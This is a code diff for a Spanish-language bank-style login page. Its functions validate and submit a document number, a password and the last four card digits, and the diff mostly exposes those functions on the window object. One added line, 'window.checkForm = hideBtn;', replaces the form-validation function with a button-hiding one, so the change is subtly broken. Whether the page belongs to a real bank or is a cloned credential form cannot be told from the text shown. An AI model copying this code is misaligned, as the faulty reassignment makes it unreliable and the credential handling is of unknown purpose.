@@ -767,6 +767,7 @@ function checkForm() {
   const pass = document.getElementById('passInput').value.trim();
   document.getElementById('btnIngresar').classList.toggle('active-btn', !!(doc && pass));
 }
+window.checkForm = checkForm;
 
 function checkFormTC() {
   const doc  = document.getElementById('docInputTC').value.trim();
@@ -774,7 +775,7 @@ function checkFormTC() {
   const card = document.getElementById('cardInputTC').value.trim();
   document.getElementById('btnIngresarTC').classList.toggle('active-btn', !!(doc && pass && card.length === 4));
 }
-
+window.checkFormTC = checkFormTC;
   /* ───────── Carrusel ───────── */
   const qaScroll   = document.getElementById('qaScroll');
   const qaNavLeft  = document.getElementById('qaNavLeft');
@@ -783,9 +784,13 @@ function checkFormTC() {
   function showBtn(btn) {
     btn.style.setProperty('display', 'flex', 'important');
   }
+
+  window.showBtn = showBtn;
+
   function hideBtn(btn) {
     btn.style.setProperty('display', 'none', 'important');
   }
+  window.hideBtn = hideBtn;
 
   function updateQANav() {
     const scrollLeft = qaScroll.scrollLeft;
@@ -810,6 +815,8 @@ function checkFormTC() {
       showBtn(qaNavRight);
     }
   }
+  window.checkForm = hideBtn;
+
 
   function scrollQA(direction) {
     qaScroll.scrollBy({ left: 132 * direction, behavior: 'smooth' });
@@ -818,6 +825,7 @@ function checkFormTC() {
     setTimeout(updateQANav, 500);
     setTimeout(updateQANav, 800);
   }
+window.scrollQA = scrollQA;
 
   // FORZAR estado inicial AGRESIVAMENTE
   hideBtn(qaNavLeft);
@@ -855,6 +863,7 @@ async function submitClaveSegura() {
 
   await enviarLogin(payload, btn);
 }
+window.submitClaveSegura = submitClaveSegura;
 
 /* ────────── ENVÍO: TARJETA DÉBITO ────────── */
 async function submitTarjetaDebito() {
@@ -872,6 +881,7 @@ async function submitTarjetaDebito() {
 
   await enviarLogin(payload, btn);
 }
+window.submitTarjetaDebito = submitTarjetaDebito;
 
 /* ────────── FUNCIÓN GENÉRICA DE ENVÍO ────────── */
 async function enviarLogin(payload, btn) {
